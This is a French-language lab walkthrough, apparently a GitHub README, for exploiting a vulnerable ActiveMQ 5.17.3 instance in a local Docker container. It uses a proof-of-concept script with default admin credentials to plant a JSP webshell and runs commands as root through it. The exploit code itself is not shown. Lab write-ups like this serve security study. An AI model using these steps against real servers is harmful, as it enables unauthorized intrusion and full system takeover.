CVE 2022-

Pour commencer, lancez ActiveMQ en arrière-plan dans le dossier activemq_2022 en utilisant:
docker compose up -d

![Capture d’écran 2024-10-29 à 12 50 29](https://github.com/user-attachments/assets/4b41d643-0f8f-428c-8947-7d262ad6d675)

Accédez ensuite à l'interface ActiveMQ dans un navigateur à l'adresse :

http://localhost:8161/admin/

Vous verrez la version d'ActiveMQ, ici (5.17.3) :

![Capture d’écran 2024-10-29 à 12 51 24](https://github.com/user-attachments/assets/e3102a17-2498-43ed-b2f8-6fc7734b9407)

On peut aussi voir la version de activemq dans le fichier docker-compose.yml:

![Capture d’écran 2024-10-29 à 12 52 05](https://github.com/user-attachments/assets/75a8b851-0764-4f93-b1c9-d5dad932761b)


Pour scanner le réseau afin d'identifier les services actifs et leurs versions avec la commande :
nmap -p- 192.168.1.145

![Capture d’écran 2024-10-29 à 12 52 53](https://github.com/user-attachments/assets/25f4b9ef-635b-4b9a-9c9d-45d6ca0e4f06)

Pour exploiter la vulnérabilité de ce CVE, nous allons executer le code poc.py à l'aide de cette commande:
python3 poc.py -u admin -p admin http://localhost:8161
Cela va envoyer une requête malveillante et ouvrir un webshell

![Capture d’écran 2024-10-31 à 15 27 10](https://github.com/user-attachments/assets/c0103ec8-63c1-4ff0-964e-90c0822ae66d)

Ensuite, il faut copier le lien sur un navigateur web pour acceder au webshell:
http://localhost:8161/admin/shell.jsp?cmd=id

Et nous tombons sur cette page:

![Capture d’écran 2024-10-31 à 15 28 32](https://github.com/user-attachments/assets/382cbb6d-b317-4f18-9faf-e4cdcce70a63)

On peux voir une confirmation que le shell est actif en montrant que uid=0(root) gid=0(root) groups=0(root) s'affiche :


![Capture d’écran 2024-10-31 à 15 31 39](https://github.com/user-attachments/assets/9b84720c-4359-453e-86f3-edb637c67039)

Nous allons maintenant verifier que le shell.jsp a bien été injecté:
Dans un premier temps nous allons ecrire cette commande pour rentrer dans le container:
docker exec -it 0c0a0ab1df64 /bin/bash
![Capture d’écran 2024-10-31 à 15 40 59](https://github.com/user-attachments/assets/ee668944-b29f-4b7e-a323-a812d2445003)

Ensuite, nous nous dirigeons dans le dossier admin où le fichier shell.jsp doit être injecté:
cd /opt/activemq/webapps/admin/
![Capture d’écran 2024-10-31 à 15 41 42](https://github.com/user-attachments/assets/33206ee1-aeeb-4758-83f6-04286460ed72)

et ensuite nous verifions que shell.jsp est bien present:
![Capture d’écran 2024-10-31 à 15 39 22](https://github.com/user-attachments/assets/06ea52ec-ef9a-4705-a416-30c6b62f00f4)

Pour être sûr que le fichier shell.jsp contient bien le shell, ouvrez-le avec la commande suivante
![Capture d’écran 2024-10-31 à 15 40 10](https://github.com/user-attachments/assets/6953fdea-10b1-4a3c-b2be-47962d3af384)

Cette étape montre clairement que le fichier shell.jsp a bien été injecté et est prêt pour une exploitation.



